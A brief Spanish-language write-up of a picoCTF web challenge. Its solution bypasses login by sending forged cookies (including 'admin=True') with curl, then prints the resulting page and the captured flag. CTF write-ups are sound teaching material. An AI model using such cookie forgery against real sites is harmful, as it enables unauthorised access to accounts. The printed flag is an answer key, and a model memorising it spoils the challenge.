---
### Descripción:
```
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594
```

### Pistas: 
```
1.- Hmm it doesn't seem to check anyone's password, except for Joe's?
```

### Solución:
- **Existe una manera editando las cookies del sitio, pero no me acuerdo como jajaja, por lo tanto haremos por el metodo consola, colocando el siguiente comando:**
```
estefania@estefania-IdeaPad-3-14ALC6:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=a; password=a; admin=True" | grep pico
```
- **Tendremos el siguiente resultado.**
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   3049      0 --:--:-- --:--:-- --:--:--  3051
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
```

### Bandera:
```
picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}
```
